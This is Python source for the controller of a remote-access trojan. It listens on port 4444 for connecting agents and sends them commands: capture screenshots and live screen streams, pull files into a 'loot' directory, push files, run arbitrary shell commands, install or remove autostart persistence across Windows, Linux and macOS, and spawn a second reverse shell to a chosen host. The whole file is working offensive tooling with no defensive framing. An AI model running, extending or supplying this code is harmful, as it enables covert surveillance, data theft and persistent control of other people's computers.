#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
server.py — controller for the RGS agent channel
protocol: [4B BE header_len][JSON header][payload of header['size'] bytes]

commands:
  sysinfo                     agent host info
  watch [N] [dir]             grab N live screenshots (0 = until Ctrl+C)
  screen                      single screenshot
  ls [path]                   list directory
  cd <path>                   change agent cwd
  pwd                         agent cwd
  download <remote> [local]   pull file
  upload <local> [remote]     push file
  cmd <command>               run shell command
  persist                     install autostart (registry / autostart / LaunchAgent)
  unpersist                   remove autostart
  revshell <ip> <port>        spawn a second reverse shell from the agent
  exit / quit                 drop session (agent keeps reconnecting)
"""
import argparse, json, os, shlex, socket, struct, sys, time

LOOT = "loot"
BUFFER = 1 << 20


# ---------- framing ----------
def send_msg(sock, header: dict, payload: bytes = b""):
    head = json.dumps(header, ensure_ascii=False).encode("utf-8")
    sock.sendall(struct.pack(">I", len(head)) + head)
    if payload:
        sock.sendall(payload)


def read_exact(sock, n: int) -> bytes:
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed")
        buf += chunk
    return bytes(buf)


def stream_exact(sock, n: int, fh):
    left = n
    while left:
        chunk = sock.recv(min(BUFFER, left))
        if not chunk:
            raise ConnectionError("peer closed while streaming payload")
        fh.write(chunk)
        left -= len(chunk)


def recv_header(sock) -> dict:
    (hlen,) = struct.unpack(">I", read_exact(sock, 4))
    return json.loads(read_exact(sock, hlen).decode("utf-8"))


def recv_msg(sock):
    header = recv_header(sock)
    size = int(header.get("size", 0))
    payload = read_exact(sock, size) if size else b""
    return header, payload


# ---------- helpers ----------
def ts():
    return time.strftime("%Y%m%d-%H%M%S")


def ensure_loot():
    os.makedirs(LOOT, exist_ok=True)


def exchange(sock, header, payload=b""):
    send_msg(sock, header, payload)
    return recv_msg(sock)


def pretty(h: dict) -> str:
    skip = {"type", "ok"}
    parts = [f"{k}={v}" for k, v in h.items() if k not in skip]
    return "  ".join(parts)


# ---------- command handlers ----------
def do_screen(sock):
    ensure_loot()
    send_msg(sock, {"cmd": "screen"})
    h = recv_header(sock)
    if h.get("type") != "screen":
        print("[-]", h)
        return
    path = os.path.join(LOOT, f"screen-{ts()}.png")
    with open(path, "wb") as fh:
        stream_exact(sock, int(h["size"]), fh)
    print(f"[+] {path}  {h.get('width')}x{h.get('height')}  {h['size']}B")


def do_watch(sock, count, delay):
    ensure_loot()
    i = 0
    try:
        while count == 0 or i < count:
            send_msg(sock, {"cmd": "screen"})
            h = recv_header(sock)
            if h.get("type") != "screen":
                print("[-]", h)
                return
            path = os.path.join(LOOT, f"live-{ts()}-{i:04d}.png")
            with open(path, "wb") as fh:
                stream_exact(sock, int(h["size"]), fh)
            print(f"\r[+] frame {i} -> {path}", end="", flush=True)
            i += 1
            time.sleep(delay)
    except KeyboardInterrupt:
        pass
    print(f"\n[+] captured {i} frames into {LOOT}/")


def do_download(sock, remote, local=None):
    ensure_loot()
    local = local or os.path.join(LOOT, os.path.basename(remote.rstrip("/\\")) or "file.bin")
    h, _ = exchange(sock, {"cmd": "download", "path": remote})
    if h.get("type") != "file":
        print("[-]", pretty(h))
        return
    with open(local, "wb") as fh:
        stream_exact(sock, int(h["size"]), fh)
    print(f"[+] pulled {remote} -> {local} ({h['size']}B)")


def do_upload(sock, local, remote):
    size = os.path.getsize(local)
    with open(local, "rb") as fh:
        send_msg(sock, {"cmd": "upload", "path": remote, "size": size})
        while True:
            chunk = fh.read(BUFFER)
            if not chunk:
                break
            sock.sendall(chunk)
    h, _ = recv_msg(sock)
    print(f"[+] pushed {local} -> {remote} ({h.get('size', size)}B) ok={h.get('ok')}")


def do_cmd(sock, command):
    h, _ = exchange(sock, {"cmd": "cmd", "cmdline": command, "timeout": 120})
    print(h.get("stdout", ""))
    if h.get("stderr"):
        print(h["stderr"], file=sys.stderr)
    print(f"[exit={h.get('code')}]")


def do_session(sock, addr):
    h, _ = exchange(sock, {"cmd": "sysinfo"})
    print(f"[+] session {addr[0]}:{addr[1]}")
    print("    " + pretty(h))

    while True:
        try:
            line = input(f"rgs[{addr[0]}]> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if not line:
            continue
        try:
            argv = shlex.split(line)
        except ValueError:
            argv = line.split()
        op, rest = argv[0].lower(), argv[1:]

        if op in ("exit", "quit", "q"):
            return
        elif op == "sysinfo":
            print(pretty(exchange(sock, {"cmd": "sysinfo"})[0]))
        elif op == "screen":
            do_screen(sock)
        elif op == "watch":
            count = int(rest[0]) if rest else 0
            delay = float(rest[1]) if len(rest) > 1 else 0.3
            do_watch(sock, count, delay)
        elif op == "download":
            do_download(sock, rest[0], rest[1] if len(rest) > 1 else None)
        elif op == "upload":
            do_upload(sock, rest[0], rest[1] if len(rest) > 1 else rest[0])
        elif op in ("cmd", "exec", "$"):
            do_cmd(sock, " ".join(rest))
        elif op == "ls":
            if os.name == "nt":
                do_cmd(sock, f'dir /b {" ".join(rest)}' if rest else "dir /b")
            else:
                do_cmd(sock, f'ls -la {" ".join(rest)}' if rest else "ls -la")
        elif op == "cd":
            do_cmd(sock, f'cd {rest[0]}' if rest else "cd")
        elif op == "pwd":
            do_cmd(sock, "cd" if os.name == "nt" else "pwd")
        elif op == "persist":
            print(pretty(exchange(sock, {"cmd": "persist"})[0]))
        elif op == "unpersist":
            print(pretty(exchange(sock, {"cmd": "unpersist"})[0]))
        elif op == "revshell":
            print(pretty(exchange(sock, {"cmd": "revshell", "host": rest[0], "port": int(rest[1])})[0]))
        elif op == "help":
            print(__doc__)
        else:
            do_cmd(sock, line)


def serve(host, port):
    ensure_loot()
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(16)
    print(f"[+] controller listening on {host}:{port}")
    while True:
        try:
            conn, addr = srv.accept()
        except KeyboardInterrupt:
            break
        conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        print(f"[+] agent connected from {addr[0]}:{addr[1]}")
        try:
            do_session(conn, addr)
        except Exception as exc:
            print(f"[-] session error: {exc}")
        finally:
            conn.close()
            print("[-] session closed, waiting for reconnect...")


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=4444)
    a = ap.parse_args()
    try:
        serve(a.host, a.port)
    except KeyboardInterrupt:
        print("\n[+] bye")
